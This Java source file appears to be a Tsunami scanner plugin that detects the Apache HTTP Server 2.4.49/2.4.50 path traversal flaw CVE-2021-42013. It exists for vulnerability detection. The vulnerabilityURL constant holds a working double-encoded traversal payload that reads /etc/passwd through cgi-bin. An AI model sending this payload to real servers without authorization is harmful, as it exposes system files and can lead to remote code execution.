package com.google.tsunami.plugins.detectors.pathtraversal.cve202142013;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the CVE-2021-42013 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheHttpServerCVE202142013VulnDetector",
    version = "1.0",
    description = "This detector checks for Apache HTTP Server 2.4.49 and 2.4.50 "
        + "path traversal and remote code execution vulnerability (CVE-2021-42013).",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = ApacheHttpServerCVE202142013VulnDetectorBootstrapModule.class
)
public class ApacheHttpServerCVE202142013VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  private final Pattern vulnerabilityResponsePattern = Pattern.compile("root:[x*]:0:0:");
  private final String vulnerabilityURL =
      "cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd";

  @Inject
  ApacheHttpServerCVE202142013VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + vulnerabilityURL;
    try {
      HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build(),
          networkService);
      Optional<String> server = response.headers().get("Server");
      Optional<String> body = response.bodyString();
      if (server.isPresent() && (server.get().contains("Apache/2.4.49") || server.get()
          .contains("Apache/2.4.50"))) {
        // require all denied
        if (response.status() == HttpStatus.FORBIDDEN && body.isPresent()
            && body.get().contains("You don't have permission to access this resource.")) {
          return false;
        }
        if (response.status() == HttpStatus.OK && body.isPresent()
            && vulnerabilityResponsePattern.matcher(body.get()).find()) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_42013"))
                .setSeverity(Severity.HIGH)
                .setTitle("Path Traversal and Remote Code Execution in "
                    + "Apache HTTP Server 2.4.49 and 2.4.50")
                .setDescription(
                    "It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 "
                        + "was insufficient. An attacker could use a path traversal attack to "
                        + "map URLs to files outside the directories configured by Alias-like "
                        + "directives.\n"
                        + "If files outside of these directories are not protected by the "
                        + "usual default configuration \"require all denied\", these requests "
                        + "can succeed. If CGI scripts are also enabled for these aliased pathes, "
                        + "this could allow for remote code execution.\n"
                        + "https://httpd.apache.org/security/vulnerabilities_24.html\n"
                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013")
                .setRecommendation("Update 2.4.51 released.")
        )
        .build();
  }
}
